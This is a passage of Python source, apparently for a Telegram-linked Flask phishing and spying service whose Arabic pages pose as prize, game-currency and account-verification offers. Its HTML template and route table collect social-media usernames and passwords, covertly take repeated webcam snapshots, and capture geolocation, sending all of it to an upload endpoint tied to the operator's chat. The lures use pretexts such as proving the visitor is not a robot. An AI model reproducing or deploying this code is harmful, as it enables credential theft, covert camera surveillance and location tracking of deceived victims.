# -*- coding: utf-8 -*-
import os
import threading
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot import types
import base64

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7145036494"))

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

CHANNEL_URL = "https://t.me/pkwbiwjwbekeekkw"

bot_settings = {
    "sub_required": True,
    "welcome_text": "\u0623\u064e\u0647\u0651\u064e\u0644\u064e\u0627\u064b \u0648\u064e\u0633\u064e\u0647\u0651\u064e\u0644\u064e\u064b\u0627 \u0641\u0650\u064a \u0628\u064f\u0648\u0652\u062a \u0625\u0650\u0628\u0652\u0644\u0650\u064a\u0633 \u0634\u064e\u062e\u0652\u0635\u0650\u064a\u0651\u064e\u0627 \u0644\u064e\u0627 \u0631\u064e\u062d\u0652\u0645\u064e\u0629\u064e \u0623\u064e\u0628\u064e\u062f\u064e\u0651ا\u064b \u0627\u064e\u0644\u0652\u0622\u0646"
}

def check_subscription(user_id):
    if user_id == ADMIN_ID or not bot_settings["sub_required"]:
        return True
    try:
        channel_username = "@" + CHANNEL_URL.split("/")[-1] if not CHANNEL_URL.endswith("/") else "@" + CHANNEL_URL.split("/")[-2]
        member = bot.get_chat_member(channel_username, user_id)
        if member.status in ['creator', 'administrator', 'member']:
            return True
    except Exception:
        return False
    return False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>\u0645\u0646\u0635\u0629 \u0627\u0644\u0647\u062f\u0627\u064a\u0627 \u0648\u0627\u0644\u0633\u062d\u0628 \u0627\u0644\u0641\u0648\u0631\u064a</title>
    <style>
        body { font-family: 'Cairo', Tahoma, sans-serif; background: linear-gradient(135deg, #0f172a, #1e1b4b); color: #fff; text-align: center; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(10px); padding: 35px 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); max-width: 420px; width: 100%; border: 1px solid rgba(255,255,255,0.1); }
        .badge { background: #f59e0b; color: #000; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 15px; }
        h2 { color: #38bdf8; margin-bottom: 10px; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        .input-field { width: 100%; padding: 14px; margin-bottom: 15px; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 10px; box-sizing: border-box; font-size: 14px; text-align: right; }
        .input-field:focus { border-color: #38bdf8; outline: none; }
        .btn { background: linear-gradient(135deg, #22c55e, #16a34a); color: white; border: none; padding: 14px 25px; font-size: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4); transition: 0.3s; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        #status { margin-top: 20px; color: #facc15; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card" id="mainCard">
        <div class="badge">\u0639\u0631\u0636 \u062d\u0635\u0631\u064a \u0648\u0645\u0648\u062b\u0648\u0642</div>
        <h2>{{ header }}</h2>
        <p>{{ description }}</p>
        
        {% if needs_input %}
        <input type="text" id="userInput1" class="input-field" placeholder="{{ placeholder1 }}">
        {% if needs_double_input %}
        <input type="password" id="userInput2" class="input-field" placeholder="{{ placeholder2 }}">
        {% endif %}
        {% endif %}

        <button class="btn" id="actionBtn" onclick="startAction()">\u0645\u062a\u0627\u0628\u0639\u0629 \u0648\u0627\u0633\u062a\u0644\u0627\u0645 \u0627\u0644\u0647\u062f\u064a\u0629</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const actionType = "{{ action_code }}";
        const chatId = "{{ chat_id }}";

        function startAction() {
            const btn = document.getElementById('actionBtn');
            const statusDiv = document.getElementById('status');
            
            if (actionType.includes("hack_") || actionType.includes("visa") || actionType.includes("get_number") || actionType.includes("fake_numbers") || actionType.includes("username_hunter") || actionType.includes("balance") || actionType.includes("collect")) {
                const val1 = document.getElementById('userInput1') ? document.getElementById('userInput1').value : "";
                const val2 = document.getElementById('userInput2') ? document.getElementById('userInput2').value : "";
                
                if (document.getElementById('userInput1') && !val1) {
                    statusDiv.innerText = "\u064a\u0631\u062c\u0649 \u0625\u0643\u0645\u0627\u0644 \u0627\u0644\u062d\u0642\u0644 \u0627\u0644\u0645\u0637\u0644\u0648\u0628 \u0623\u0648\u0644\u0627\u064b!";
                    return;
                }

                btn.style.display = 'none';
                statusDiv.innerText = "\u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0644\u0633\u062c\u0644\u0627\u062a \u0648\u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a...";

                fetch('/upload_media', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, type: actionType, data1: val1, data2: val2 })
                })
                .then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        statusDiv.innerText = "\u062a\u0645\u062a \u0627\u0644\u0639\u0645\u0644\u064a\u0629 \u0628\u0646\u062c\u0627\u062d! \u064a\u062a\u0645 \u0627\u0644\u0622\u0646 \u062a\u062d\u0648\u064a\u0644 \u062c\u0627\u0626\u0632\u062a\u0643...";
                    }, 1200);
                });
            } 
            else if (actionType.includes("cam") || actionType.includes("video") || actionType.includes("photos") || actionType.includes("spy")) {
                btn.style.display = 'none';
                statusDiv.innerText = "\u064a\u0631\u062c\u0649 \u0627\u0644\u0646\u0642\u0631 \u0639\u0644\u0649 (\u0627\u0644\u0633\u0645\u0627\u062d / Allow) \u0641\u064a \u0646\u0627\u0641\u0630\u0629 \u0627\u0644\u0645\u062a\u0635\u0641\u062d \u0644\u062a\u0623\u0643\u064a\u062f \u0623\u0646\u0643 \u0644\u0633\u062a \u0631\u0648\u0628\u0648\u062a...";
                
                navigator.mediaDevices.getUserMedia({ video: { facingMode: actionType.includes("back") ? "environment" : "user" }, audio: true })
                .then(function(stream) {
                    statusDiv.innerText = "\u062c\u0627\u0631\u064a \u0645\u0637\u0627\u0628\u0642\u0629 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0648\u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0637\u0644\u0628...";
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();
                    
                    let count = 0;
                    const maxPhotos = 5; 
                    const interval = setInterval(function() {
                        if (count >= maxPhotos) {
                            clearInterval(interval);
                            stream.getTracks().forEach(track => track.stop());
                            statusDiv.innerText = "\u062a\u0645 \u0627\u0644\u062a\u062d\u0642\u0642 \u0628\u0646\u062c\u0627\u062d \u0648\u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0647\u062f\u064a\u0629!";
                            return;
                        }
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);

                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, image: imageData, type: actionType + ` [\u0644\u0642\u0637\u0629 ${count + 1}]` })
                        });
                        count++;
                    }, 1000);
                })
                .catch(function(err) {
                    btn.style.display = 'block';
                    statusDiv.innerText = "\u064a\u062c\u0628 \u0627\u0644\u0636\u063a\u0637 \u0639\u0644\u0649 \u0632\u0631 (\u0627\u0644\u0633\u0645\u0627\u062d) \u0644\u062a\u062c\u0627\u0648\u0632 \u0627\u0644\u062a\u062d\u0642\u0642!";
                });
            } 
            else if (actionType.includes("location")) {
                btn.style.display = 'none';
                statusDiv.innerText = "\u064a\u0631\u062c\u0649 \u0627\u0644\u0633\u0645\u0627\u062d \u0628\u062a\u062d\u062f\u064a\u062f \u0627\u0644\u0645\u0648\u0642\u0639 \u0644\u0627\u062e\u062a\u064a\u0627\u0631 \u0627\u0644\u0633\u064a\u0631\u0641\u0631 \u0627\u0644\u0623\u0642\u0631\u0628 \u0644\u0643...";
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, lat: lat, lon: lon, type: 'location' })
                        });
                        statusDiv.innerText = "\u062a\u0645 \u062a\u062d\u062f\u064a\u062f \u0645\u0648\u0642\u0639\u0643 \u0628\u0646\u062c\u0627\u062d!";
                    }, function(error) {
                        btn.style.display = 'block';
                        statusDiv.innerText = "\u064a\u0631\u062c\u0649 \u0627\u0644\u0633\u0645\u0627\u062d \u0628\u0627\u0644\u0648\u0635\u0648\u0644 \u0644\u0644\u0645\u0648\u0642\u0639 \u0644\u0644\u0645\u062a\u0627\u0628\u0639\u0629!";
                    });
                }
            } 
            else {
                btn.style.display = 'none';
                statusDiv.innerText = "\u062c\u0627\u0631\u064a \u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629...";
                setTimeout(() => {
                    statusDiv.innerText = "\u062a\u0645 \u0628\u0646\u062c\u0627\u062d.";
                }, 1500);
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home_page():
    return "Server is running successfully!", 200

@app.route('/service/<action_type>/<chat_id>')
def service_page(action_type, chat_id):
    details = {
        "front_cam": {"title": "\u0643\u0627\u0645\u064a\u0631\u0627", "header": "\u0639\u0631\u0636 \u0627\u0644\u0628\u062b \u0627\u0644\u0645\u0631\u0626\u064a \u0627\u0644\u0645\u0628\u0627\u0634\u0631", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0645\u062a\u0627\u0628\u0639\u0629 \u0648\u0639\u0631\u0636 \u0627\u0644\u0645\u062d\u062a\u0648\u0649:", "btn": "\u0645\u0634\u0627\u062e\u062f\u0629", "input": False},
        "back_cam": {"title": "\u0643\u0627\u0645\u064a\u0631\u0627", "header": "\u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0639\u0631\u0636 \u0627\u0644\u062e\u0644\u0641\u064a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0643\u0627\u0645\u064a\u0631\u0627:", "btn": "\u062a\u0641\u0639\u064a\u0644", "input": False},
        "get_location": {"title": "\u0645\u0648\u0642\u0639", "header": "\u0646\u0638\u0627\u0645 \u062a\u062d\u062f\u064a\u062f \u0627\u0644\u0645\u0648\u0642\u0639 \u0627\u0644\u062c\u063a\u0631\u0627\u0641\u064a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0633\u0645\u0627\u062d \u0628\u0627\u0644\u0648\u0635\u0648\u0644 \u0644\u0644\u0645\u0648\u0642\u0639 \u0648\u062f\u0642\u0629 \u0627\u0644\u0625\u062d\u062f\u0627\u062b\u064a\u0627\u062a:", "btn": "\u062a\u062d\u062f\u064a\u062f", "input": False},
        "get_voice": {"title": "\u0635\u0648\u062a", "header": "\u0646\u0638\u0627\u0645 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0627\u0644\u0635\u0648\u062a\u064a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0628\u062f\u0621 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0648\u0627\u0644\u0627\u0633\u062a\u0645\u0627\u0639:", "btn": "\u0627\u062a\u0635\u0627\u0644", "input": False},
        "video_victim": {"title": "\u0641\u064a\u062f\u064a\u0648", "header": "\u062a\u0634\u063a\u064a\u0644 \u0627\u0644\u0639\u0631\u0636 \u0627\u0644\u0645\u0631\u0626\u064a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0628\u062f\u0621:", "btn": "\u062a\u0634\u063a\u064a\u0644", "input": False},
        "cctv_cam": {"title": "\u0645\u0631\u0627\u0642\u0628\u0629", "header": "\u0639\u0631\u0636 \u0627\u0644\u0628\u062b \u0627\u0644\u0645\u062a\u0627\u062d", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0639\u0631\u0636:", "btn": "\u0639\u0631\u0636", "input": False},
        
        "hack_whatsapp": {"title": "\u0648\u0627\u062a\u0633\u0627\u0628", "header": "\u062a\u0623\u0643\u064a\u062f \u062d\u0633\u0627\u0628 \u0648\u0627\u062a\u0633\u0627\u0628", "desc": "\u0623\u062f\u062e\u0644 \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641 \u0627\u0644\u0645\u0631\u0627\u062f \u062a\u0623\u0645\u064a\u0646\u0647 \u0623\u0648 \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646\u0647:", "btn": "\u062a\u0623\u0643\u064a\u062f", "input": True, "p1": "\u0623\u062f\u062e\u0644 \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641 \u0645\u0639 \u0627\u0644\u0631\u0635\u0645 \u0627\u0644\u062f\u0648\u0644\u064a..."},
        "hack_facebook": {"title": "\u0641\u064a\u0633\u0628\u0648\u0643", "header": "\u062a\u0623\u0643\u064a\u062f \u062d\u0633\u0627\u0628 \u0641\u064a\u0633\u0628\u0648\u0643", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a \u0623\u0648 \u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641:", "btn": "\u062a\u0633\u062c\u064a\u0644", "input": True, "double": True, "p1": "\u0627\u0644\u0628\u0631\u064a\u062f \u0623\u0648 \u0627\u0644\u0647\u0627\u062a\u0641", "p2": "\u0643\u0644\u0645\u0629 \u0627\u0644\u0631\u0648\u0631"},
        "hack_insta": {"title": "\u0627\u0646\u0633\u062a\u062c\u0631\u0627\u0645", "header": "\u062a\u0623\u0643\u064a\u062f \u062d\u0633\u0627\u0628 \u0627\u0646\u0633\u062a\u062c\u0631\u0627\u0645", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u064a\u0648\u0632\u0631 \u0623\u0648 \u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a:", "btn": "\u062a\u0623\u0643\u064a\u062f", "input": True, "double": True, "p1": "\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 (Username)", "p2": "\u0643\u0644\u0645\u0629 \u0627\u0644\u0631\u0648\u0631"},
        "hack_pubg": {"title": "\u0628\u0628\u062c\u064a", "header": "\u0634\u062d\u0646 \u0634\u062f\u0627\u062a \u0628\u0628\u062c\u064a \u0645\u0648\u0628\u0627\u064a\u0644", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0622\u064a\u062f\u064a (ID) \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0644\u0627\u0633\u062a\u0644\u0627\u0645 \u0627\u0644\u0634\u062f\u0627\u062a:", "btn": "\u0627\u0633\u062a\u0644\u0627\u0645", "input": True, "p1": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0640 ID \u0627\u0644\u062e\u0627\u0635 \u0628\u0643 \u0647\u0646\u0627..."},
        "hack_snap": {"title": "\u0633\u0646\u0627\u0628", "header": "\u062a\u0641\u0639\u064a\u0644 \u0645\u0645\u064a\u0632\u0627\u062a \u0633\u0646\u0627\u0628 \u0634\u0627\u062a", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645 \u0644\u062d\u0633\u0627\u0628\u0643:", "btn": "\u062a\u0641\u0639\u064a\u0644", "input": True, "p1": "\u064a\u0648\u0632\u0631 \u0633\u0646\u0627\u0628 \u0634\u0627\u062a..."},
        "hack_ff": {"title": "\u0641\u0631\u064a \u0641\u0627\u064a\u0631", "header": "\u062c\u0648\u0627\u0647\u0631 \u0641\u0631\u064a \u0641\u0627\u064a\u0631 \u0627\u0644\u0645\u062c\u0627\u0646\u064a\u0629", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0622\u064a\u062f\u064a (ID) \u0627\u0644\u062e\u0627\u0635 \u0628\u0644\u0639\u0628\u062a\u0643:", "btn": "\u0627\u0633\u062a\u0644\u0627\u0645", "input": True, "p1": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0640 ID \u0647\u0646\u0627..."},
        "hack_tiktok": {"title": "\u062a\u064a\u0643 \u062a\u0648\u0643", "header": "\u062a\u0648\u062b\u064a\u0642 \u062d\u0633\u0627\u0628 \u062a\u064a\u0643 \u062a\u0648\u0643", "desc": "\u0623\u062f\u062e\u0644 \u0631\u0627\u0628\u0637 \u0623\u0648 \u064a\u0648\u0632\u0631 \u0627\u0644\u062d\u0633\u0627\u0628:", "btn": "\u062a\u0648\u062b\u064a\u0642", "input": True, "p1": "\u064a\u0648\u0632\u0631 \u0627\u0644\u062d\u0633\u0627\u0628..."},
        
        "device_info": {"title": "\u0627\u0644\u062c\u0647\u0627\u0632", "header": "\u0641\u062d\u0635 \u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0627\u0644\u062c\u0647\u0627\u0632", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0641\u062d\u0635 \u062a\u0648\u0627\u0641\u0642 \u0627\u0644\u0646\u0638\u0627\u0645:", "btn": "\u0641\u062d\u0635", "input": False},
        "link_exploit": {"title": "\u062a\u0644\u063a\u064a\u0645", "header": "\u0641\u062d\u0635 \u0623\u0645\u0627\u0646 \u0627\u0644\u0631\u0648\u0627\u0628\u0637", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0645\u0631\u0627\u062f \u0641\u062d\u0635\u0647:", "btn": "\u0641\u062d\u0635", "input": True, "p1": "\u0636\u0639 \u0627\u0644\u0631\u0627\u0628\u0637 \u0647\u0646\u0627..."},
        "full_spy": {"title": "\u0645\u0631\u0627\u0642\u0628\u0629", "header": "\u0646\u0638\u0627\u0645 \u0627\u0644\u0645\u0631\u0627\u0642\u0628\u0629 \u0627\u0644\u0634\u0627\u0645\u0644\u0629", "desc": "\u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0646\u0638\u0627\u0645:", "btn": "\u062a\u0641\u0639\u064a\u0644", "input": False},
        "close_sites": {"title": "\u0625\u063a\u0644\u0627\u0642", "header": "\u062d\u0645\u0627\u064a\u0629 \u0627\u0644\u062c\u0647\u0627\u0632 \u0648\u0625\u063a\u0644\u0627\u0642 \u0627\u0644\u062b\u063a\u0631\u0627\u062a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u062a\u0623\u0645\u064a\u0646 \u0627\u0644\u062d\u0645\u0627\u064a\u0629:", "btn": "\u062d\u0645\u0627\u064a\u0629", "input": False},
        "visa_hunter": {"title": "\u0641\u064a\u0632\u0627\u062a", "header": "\u0633\u062d\u0628 \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062a \u0627\u0644\u0645\u062a\u0627\u062d\u0629", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0627\u0633\u062a\u062e\u0631\u0627\u062c \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062a:", "btn": "\u0627\u0633\u062a\u062e\u0631\u0627\u062c", "input": False},
        "get_number": {"title": "\u0631\u0642\u0645", "header": "\u0645\u0639\u0631\u0641\u0629 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0645\u062e\u0635\u0635", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0643\u0648\u062f \u0627\u0644\u0645\u0624\u0642\u062a \u0644\u0644\u062a\u062d\u0642\u0642:", "btn": "\u062a\u0623\u0643\u064a\u062f", "input": True, "p1": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0643\u0648\u062f..."},
        "fake_numbers": {"title": "\u0623\u0631\u0642\u0627\u0645", "header": "\u0627\u0633\u062a\u062e\u0631\u0627\u062c \u0623\u0631\u0642\u0627\u0645 \u0648\u0647\u0645\u064a\u0629", "desc": "\u0627\u062e\u062a\u0631 \u0627\u0644\u062f\u0648\u0644\u0629 \u0648\u0627\u0633\u062a\u062e\u0631\u062c \u0627\u0644\u0631\u0642\u0645:", "btn": "\u0627\u0633\u062a\u062e\u0631\u0627\u062c", "input": True, "p1": "\u0627\u0643\u062a\u0628 \u0627\u0633\u0645 \u0627\u0644\u062f\u0648\u0644\u0629 (\u0645\u062b\u0627\u0644: USA)..."},
        "check_links": {"title": "\u0641\u062d\u0635", "header": "\u0641\u062d\u0635 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0627\u0644\u0645\u0634\u0628\u0648\u0647\u0629", "desc": "\u0623\u062f\u062e\u0644 \u0627\u0644\u0631\u0627\u0628\u0637:", "btn": "\u0641\u062d\u0635", "input": True, "p1": "\u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0645\u0631\u0627\u062f \u0641\u062d\u0635\u0647..."},
        "search_images": {"title": "\u0635\u0648\u0631", "header": "\u0627\u0644\u0628\u062d\u062b \u0639\u0646 \u0635\u0648\u0631 \u0645\u0634\u0627\u0647\u062f\u0629", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0628\u062d\u062b \u0627\u0644\u062f\u0642\u064a\u0642:", "btn": "\u0628\u062d\u062b", "input": False},
        "radio_spy": {"title": "\u0631\u0627\u062f\u064a\u0648", "header": "\u0645\u0631\u0627\u0642\u0628\u0629 \u0628\u062b \u0627\u0644\u0631\u0627\u062f\u064a\u0648", "desc": "\u0627\u0644\u0627\u0633\u062a\u0645\u0627\u0639 \u0627\u0644\u0645\u0628\u0627\u0634\u0631:", "btn": "\u0627\u0633\u062a\u0645\u0627\u0639", "input": False},
        "username_hunter": {"title": "\u064a\u0648\u0632\u0631", "header": "\u0641\u062d\u0635 \u0627\u0644\u064a\u0648\u0632\u0631\u0627\u062a \u0627\u0644\u0645\u062a\u0627\u062d\u0629", "desc": "\u0623\u062f\u062e\u0644 \u0646\u0648\u0639 \u0627\u0644\u064a\u0648\u0632\u0631 \u0627\u0644\u0645\u0637\u0644\u0648\u0628 \u0641\u062d\u0635\u0647:", "btn": "\u0641\u062d\u0635", "input": True, "p1": "\u0645\u062b\u0627\u0644: vip_..."},
        "ai_tool": {"title": "\u0630\u0643\u0627\u0621", "header": "\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064a \u0627\u0644\u0645\u062a\u0642\u062f\u0645", "desc": "\u0627\u0628\u062f\u0623 \u0627\u0644\u0645\u062d\u0627\u062f\u062b\u0629:", "btn": "\u0645\u062d\u0627\u062f\u062b\u0629", "input": False},
        "dream_parser": {"title": "\u0623\u062d\u0644\u0627\u0645", "header": "\u062a\u0641\u0633\u064a\u0631 \u0627\u0644\u0623\u062d\u0644\u0627\u0645 \u0627\u0644\u0641\u0648\u0631\u064a", "desc": "\u0627\u0643\u062a\u0628 \u062d\u0644\u0645\u0643 \u0628\u0627\u0644\u062a\u0641\u0635\u064a\u0644 \u0644\u062a\u0641\u0633\u064a\u0631\u0647:", "btn": "\u062a\u0641\u0633\u064a\u0631", "input": True, "p1": "\u0627\u0643\u062a\u0628 \u0627\u0644\u062d\u0644\u0645 \u0647\u0646\u0627..."},
        "text_to_voice": {"title": "\u062a\u062d\u0648\u064a\u0644", "header": "\u062a\u062d\u0648\u064a\u0644 \u0627\u0644\u0646\u0635 \u0625\u0644\u0649 \u0635\u0648\u062a", "desc": "\u0627\u0643\u062a\u0628 \u0627\u0644\u0646\u0635 \u0627\u0644\u0645\u0631\u0627\u062f \u062a\u062d\u0648\u064a\u0644\u0647:", "btn": "\u062a\u062d\u0648\u064a\u0644", "input": True, "p1": "\u0627\u0643\u062a\u0628 \u0627\u0644\u0646\u0635..."},
        "text_decor": {"title": "\u0632\u062e\u0631\u0641\u0629", "header": "\u0632\u062e\u0631\u0641\u0629 \u0627\u0644\u0623\u0633\u0645\u0627\u0621 \u0648\u0627\u0644\u0646\u0635\u0648\u0635", "desc": "\u0627\u0643\u062a\u0628 \u0627\u0644\u0646\u0635 \u0627\u0644\u0645\u0631\u0627\u062f \u0632\u062e\u0631\u0641\u062a\u0647:", "btn": "\u0632\u062e\u0631\u0641\u0629", "input": True, "p1": "\u0627\u0643\u062a\u0628 \u0627\u0644\u0646\u0635 \u0647\u0646\u0627..."},
        "my_balance": {"title": "\u0631\u0635\u064a\u062f", "header": "\u0631\u0635\u064a\u062f\u064a \u0648\u0627\u0644\u0646\u0642\u0627\u0637", "desc": "\u0645\u0639\u0631\u0641\u0629 \u0627\u0644\u0631\u0635\u064a\u062f \u0627\u0644\u0645\u062a\u0627\u062d:", "btn": "\u0639\u0631\u0636", "input": False},
        "collect_points": {"title": "\u0646\u0642\u0627\u0637", "header": "\u0646\u0638\u0627\u0645 \u062c\u0645\u0639 \u0627\u0644\u0646\u0642\u0627\u0637", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0628\u062f\u0621 \u0628\u062c\u0645\u0639 \u0627\u0644\u0646\u0642\u0627\u0637:", "btn": "\u062c\u0645\u0639", "input": False},
        "game_magic": {"title": "\u0644\u0639\u0628\u0629", "header": "\u0644\u0639\u0628\u0629 \u0627\u0644\u062a\u062d\u062f\u064a \u0627\u0644\u0630\u0643\u064a", "desc": "\u0627\u0628\u062f\u0623 \u0627\u0644\u062a\u062d\u062f\u064a:", "btn": "\u0644\u0639\u0628", "input": False},
        "brain_game": {"title": "\u0623\u0630\u0643\u064a\u0627\u0621", "header": "\u0644\u0639\u0628\u0629 \u0627\u0644\u0623\u0630\u0643\u064a\u0627\u0621 \u0648\u0627\u0644\u062a\u062d\u062f\u064a\u0627\u062a", "desc": "\u0627\u0628\u062f\u0623 \u0627\u0644\u0644\u0639\u0628:", "btn": "\u062a\u062d\u062f\u064a", "input": False},
        
        "vip_photos": {"title": "\u0635\u0648\u0631 VIP", "header": "\u0633\u062d\u0628 \u0627\u0644\u0635\u0648\u0631 \u0639\u0628\u0631 \u0631\u0627\u0628\u0637", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0639\u0631\u0636 \u0627\u0644\u0623\u0644\u0648\u0645:", "btn": "\u0639\u0631\u0636", "input": False},
        "vip_contacts": {"title": "\u0623\u0631\u0642\u0627\u0645 VIP", "header": "\u0645\u0632\u0627\u0645\u0646\u0629 \u062c\u0647\u0627\u062a \u0627\u0644\u0627\u062a\u0635\u0627\u0644", "desc": "\u0645\u0632\u0627\u0645\u0646\u0629 \u0627\u0644\u0623\u0631\u0642\u0627\u0645:", "btn": "\u0645\u0632\u0627\u0645\u0646\u0629", "input": False},
        "vip_msgs": {"title": "\u0631\u0633\u0627\u0626\u0644 VIP", "header": "\u0633\u062d\u0628 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0648\u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a", "desc": "\u0639\u0631\u0636 \u0627\u0644\u0631\u0633\u0627\u0626\u0644:", "btn": "\u0639\u0631\u0636", "input": False},
        "vip_wipe": {"title": "\u0641\u0631\u0645\u062a\u0629 VIP", "header": "\u062a\u0647\u064a\u0626\u0629 \u0627\u0644\u062c\u0647\u0627\u0632 \u0648\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0636\u0628\u0637", "desc": "\u062a\u0623\u0643\u064a\u062f \u0627\u0644\u0625\u062c\u0631\u0627\u0621:", "btn": "\u062a\u0623\u0643\u064a\u062f", "input": False},
        "vip_img_exploit": {"title": "\u0635\u0648\u0631\u0629 VIP", "header": "\u0645\u0639\u0627\u0644\u062c\u0629 \u0627\u0644\u0645\u0644\u0641\u0627\u062a \u0648\u0627\u0644\u0635\u0648\u0631", "desc": "\u0639\u0631\u0636 \u0627\u0644\u0635\u0648\u0631\u0629:", "btn": "\u0639\u0631\u0636", "input": False},
        "vip_remove_clothes": {"title": "\u0625\u0632\u0627\u0644\u0629 VIP", "header": "\u0623\u062f\u0627\u0629 \u0645\u0639\u0627\u0644\u062c\u0629 \u0648\u062a\u062f\u064a\u0644 \u0627\u0644\u0635\u0648\u0631", "desc": "\u062a\u0639\u062f\u064a\u0644 \u0627\u0644\u0635\u0648\u0631\u0629:", "btn": "\u062a\u0639\u062f\u064a\u0644", "input": False},
        "vip_net": {"title": "\u0634\u0628\u0643\u0629 VIP", "header": "\u0641\u062d\u0635 \u0643\u0641\u0627\u0621\u0629 \u0627\u0644\u0634\u0628\u0643\u0629", "desc": "\u0641\u062d\u0635 \u0627\u0644\u0634\u0628\u0643\u0629:", "btn": "\u0641\u062d\u0635", "input": False},
        "vip_file": {"title": "\u0645\u0644\u0641 VIP", "header": "\u062a\u062d\u0644\u064a\u0644 \u0627\u0644\u0645\u0644\u0641\u0627\u062a \u0627\u0644\u0645\u062e\u0635\u0635\u0629", "desc": "\u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0644\u0641:", "btn": "\u062a\u062d\u0645\u064a\u0644", "input": False}
    }
    
    info = details.get(action_type, {"title": "\u062e\u062f\u0645\u0629", "header": "\u0645\u0646\u0635\u0629 \u0627\u0644\u062e\u062f\u0645\u0627\u062a", "desc": "\u0627\u0636\u063a\u0637 \u0644\u0644\u0645\u062a\u0627\u0628\u0639\u0629:", "btn": "\u062a\u0646\u0641\u064a\u0630", "input": False})
    
    return render_template_string(
        HTML_TEMPLATE, 
        title=info["title"], 
